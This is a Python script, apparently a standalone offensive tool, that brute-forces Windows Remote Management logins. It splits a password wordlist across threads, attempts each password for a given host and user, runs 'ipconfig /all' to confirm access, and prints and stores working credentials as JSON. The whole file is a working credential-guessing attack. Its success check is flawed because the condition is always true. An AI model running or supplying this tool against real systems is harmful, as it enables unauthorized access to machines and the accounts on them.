import winrm
from multiprocessing import Process, cpu_count
import itertools
from threading import Thread, Lock
import os
import sys
import json

lock = Lock() 
Success_LIST = []


class Winrm_Brute(object):

   

   def __init__(self):
 
        self.PROCESS =  cpu_count() * 2


   def brute_winrm(self,host,user,password):
       for passes in password:  
           try:
              print(host,user,passes)
              s = winrm.Session(str(host), auth=(str(user), str(passes)))
              r = s.run_cmd('ipconfig', ['/all'])
              print(r.status_code)

              if r.status_code == 0:
                 lock.acquire()
                 winrm_response = r.std_out.split()
                 if "Windows" or "Configuration" or "IP" in winrm_response:

                     response = {}
                     try:
                        response['ip'] = host
                        response['user'] = user
                        response['pass'] = passes
                        json_ready = json.dumps(response)
                        Success_LIST.append(json_ready)
                        print(json_ready)
                  
                     finally:
                        lock.release()
                        sys.exit()
                 else:
                    print(r.std_err)
           except Exception as ex:
              print(ex)
              continue
           




   def get_passes(self,dataset_path):
    
        passes = []

        file = open(dataset_path, "r")
        dataset = list(filter(None, file.read().split("\n")))
    
        for line in dataset:
            passes.append(line.strip())

        return passes


   def words_to_process(self,a, n):
        #ode to devil the best coder i know ;)
        k, m = divmod(len(a), n)
        for i in range(n):
            yield a[i * k + min(i, m):(i + 1) * k + min(i + 1, m)]


Winrm_Bruter = Winrm_Brute()
host = sys.argv[1]
username = sys.argv[2]
word_list = Winrm_Bruter.get_passes(sys.argv[3])
passes_to_try = Winrm_Bruter.words_to_process(word_list,Winrm_Bruter.PROCESS)
for _ in range(Winrm_Bruter.PROCESS):
    try:
       p = Thread(target=Winrm_Bruter.brute_winrm, args=(host,username,next(passes_to_try), ))
       p.daemon = True
       p.start()
    except:
        pass
for _ in range(Winrm_Bruter.PROCESS):
    p.join()
